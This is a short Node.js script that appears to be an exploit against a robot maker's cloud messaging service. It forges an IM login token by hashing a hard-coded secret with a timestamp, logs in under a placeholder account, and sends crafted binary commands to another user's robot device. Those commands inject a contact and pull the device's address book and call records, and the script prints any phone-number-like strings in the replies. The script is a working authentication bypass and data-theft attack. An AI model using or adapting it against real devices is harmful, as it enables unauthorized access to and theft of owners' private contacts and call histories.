require("./shim");
const TIM = require("tim-js-sdk");
const https = require("https");
const crypto = require("crypto");
function mint(uid){return new Promise((res,rej)=>{const t=Date.now().toString();
const sig=crypto.createHash("md5").update("IM$SeCrET"+t).digest("hex");
https.get(`https://apis.ubtrobot.com/im/getInfo?signature=${sig}&time=${t}&userId=${uid}&channel=MINIEDUCN`,r=>{let b="";r.on("data",d=>b+=d);r.on("end",()=>{try{res(JSON.parse(b).returnMap.userSig)}catch(e){rej(e)}})}).on("error",rej)})}
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const ascii=s=>[...s].map(c=>c.charCodeAt(0)&0x7f);
function buildMsg(cmd,serial,body){
  const header=[0x08,cmd,0x10,1,0x18,serial];
  const msg=[0x0a,header.length,...header,0x12,body.length,...body];
  if(msg.some(b=>b>0x7f)) throw new Error("non-ascii");
  return String.fromCharCode(...msg);
}
(async()=>{
const tim=TIM.create({SDKAppID:1400032988}); tim.setLogLevel(0);
let rr; const ready=new Promise(r=>rr=r);
tim.on(TIM.EVENT.SDK_READY,()=>rr());
tim.on(TIM.EVENT.MESSAGE_RECEIVED,e=>{e.data.forEach(m=>{
const raw=(m.payload&&m.payload.data)||"";
const codes=[...raw].map(c=>c.charCodeAt(0).toString(16).padStart(2,"0")).join(" ");
console.log("[!!!] 回包 len=",raw.length," hex:",codes.slice(0,500));
console.log("      数字串:",raw.match(/[0-9]{5,}/g)||[]);
console.log("      可读:",(raw.match(/[\x20-\x7e]{3,}/g)||[]).join(" | ").slice(0,300));
})});
const us=await mint("sigvoid_probe_nonexist_9x7z");
await tim.login({userID:"<账户_01>",userSig:us});
console.log("[+] 已登录");
await Promise.race([ready,sleep(10000)]);
// CmContactInfo{ name="WANTEST", phone="13800138000" }
const contact=[0x12,7,...ascii("WANTEST"),0x1a,11,...ascii("13800138000")];
// body: field1 contactList(repeated)=contact, field2 userId="<账户_01>"
const body120=[0x0a,contact.length,...contact,0x12,7,...ascii("wantest")];
for (const [label,cmd,serial,body] of [
  ["cmd120 导入联系人",120,95,body120],
  ["cmd121 查通讯录(ver=0)",121,96,[0x08,0,0x10,1]],
  ["cmd125 查通话记录",125,97,[0x08,0,0x10,1]],
]) {
  const m=tim.createCustomMessage({to:"<其他机器人设备_01>",conversationType:TIM.TYPES.CONV_C2C,
    payload:{data:buildMsg(cmd,serial,body),description:"",extension:""}});
  const sent=await tim.sendMessage(m);
  console.log("[+]",label,"投递",sent.data.message.status);
  await sleep(8000);
}
await sleep(5000);
try{await tim.logout()}catch(e){}
process.exit(0);
})().catch(e=>{console.error("[-]",e.message);process.exit(2)});
